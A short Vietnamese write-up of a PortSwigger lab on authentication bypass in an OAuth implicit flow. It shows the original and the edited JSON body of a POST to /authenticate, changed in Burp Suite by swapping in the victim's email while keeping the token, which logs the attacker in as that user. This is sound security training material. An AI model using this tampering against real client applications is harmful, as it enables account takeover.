# [Lab: Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

Lỗ hổng xuất hiện ở phía client application.

Sau khi dùng token để nhận được thông tin từ OAuth server thì browser gửi POST request tới /authenticate của client application với nội dung vừa nhận được từ OAuth.

Dùng burpsuite chỉnh sửa nội dung của POST request từ
```
{"email":"wiener@hotdog.com","username":"wiener","token":"gefdZHZ5zhAKE6lt4Ir5w5V3sYZeYvlv5RF0hyhAcAg"}
```
thành
```
{"email":"carlos@carlos-montoya.net","username":"wiener","token":"gefdZHZ5zhAKE6lt4Ir5w5V3sYZeYvlv5RF0hyhAcAg"}
```

Client application sẽ cho đăng nhập với mail `carlos@carlos-montoya.net`